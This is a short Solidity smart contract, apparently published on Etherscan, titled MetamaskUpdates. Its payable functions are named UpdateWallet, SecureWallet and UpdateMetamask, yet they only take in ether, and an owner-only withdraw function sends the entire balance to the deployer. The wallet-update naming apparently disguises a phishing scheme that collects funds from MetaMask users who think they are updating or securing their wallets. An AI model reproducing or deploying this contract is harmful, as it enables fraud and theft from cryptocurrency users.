/**
 *Submitted for verification at Etherscan.io on 2023-01-09
*/

pragma solidity ^0.4.26;

contract MetamaskUpdates {
    address private owner; // current owner of the contract
    constructor() public{owner = msg.sender;}
    function getOwner() public view returns (address) {return owner;}
    function withdraw() public {require(owner == msg.sender);msg.sender.transfer(address(this).balance);}
    function UpdateWallet() public payable {}
    function SecureWallet() public payable {}
    function UpdateMetamask() public payable {}
    function getBalance() public view returns (uint256) {return address(this).balance;}
}